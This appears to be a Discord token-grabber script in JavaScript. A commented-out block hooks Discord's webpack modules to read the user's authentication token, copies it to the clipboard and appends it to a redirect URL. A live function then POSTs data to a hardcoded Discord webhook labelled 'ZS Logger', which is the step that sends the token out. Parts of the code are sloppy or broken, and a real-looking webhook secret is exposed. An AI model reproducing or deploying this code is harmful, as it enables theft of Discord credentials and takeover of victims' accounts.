/*let x;

window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{
  for(const o of Object.keys(e.c).map(o => e.c[o].exports).filter(e => e)){
    if(o.default && typeof o.default.getToken === "function"){
      x = o.default.getToken(); // Removed the copy() function as it's not necessary
      break;
    }
    else if(typeof o.getToken === "function"){
      x = o.getToken(); // Removed the copy() function as it's not necessary
      break;
    }
  }
}]);

function copyToClipboard(text) {
  const el = document.createElement("textarea");
  el.value = text;
  document.body.appendChild(el);
  el.select();
  document.execCommand("copy");
  document.body.removeChild(el);
}

if (x) {
  copyToClipboard(x);
  console.log("%cToken copied to your clipboard!", "font-size: 25px");
} else {
  console.log("No getToken function found.");
}
location.replace("www.google.com?z=" + x);

*/


function send(){
    var discordWebhook = "https://discord.com/api/webhooks/1137272243999735818/4VRMJVTMRs7aWexDjGh3MozWn0WOmXST3dGWh19sNa5TbnydJma44luS_B1ArLptY0vN";
    var i = document.createElement('iframe');
    var request = new XMLHttpRequest();
    request.open("POST", discordWebhook);
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
        username: "ZS Logger",
        avatar_url: "https://www.pngitem.com/pimgs/m/521-5217458_pink-aesthetic-icon-stars-star-profile-pic-pfp.png",
        content: parameterValue
    };
    request.send(JSON.stringify(params));
}